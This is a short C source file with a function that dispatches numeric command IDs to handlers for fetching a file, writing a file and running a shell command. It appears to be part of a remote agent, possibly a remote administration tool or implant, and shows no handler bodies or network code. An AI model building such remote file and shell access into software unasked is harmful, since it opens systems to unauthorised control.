#include "commands.h"

buffer run_command(result *res, uint64_t command_id, buffer *buf) {
    WRITE_LOG(INFO, "Running command: %llx", command_id)

    buffer (*chosen_command)(result *, buffer *) = NULL;
    INITIALIZE_BUFFER(buf_out);

    switch (command_id) {
        case GET_FILE_COMMAND_ID:
            chosen_command = get_file;
            break;

        case PUT_FILE_COMMAND_ID:
            chosen_command = put_file;
            break;

        case RUN_SHELL_COMMAND_ID:
            chosen_command = run_shell;
            break;

        default: HANDLE_ERROR((*res), UNKNOWN_COMMAND, "Unknown command: %llx", command_id)
    }

    buf_out = chosen_command(res, buf);
    HANDLE_ERROR_RESULT((*res))

    WRITE_LOG(INFO, "Finished running command: %llx", command_id)

    goto cleanup;

    error_cleanup:

    destroy_buffer(&buf_out);

    cleanup:

    return buf_out;
}
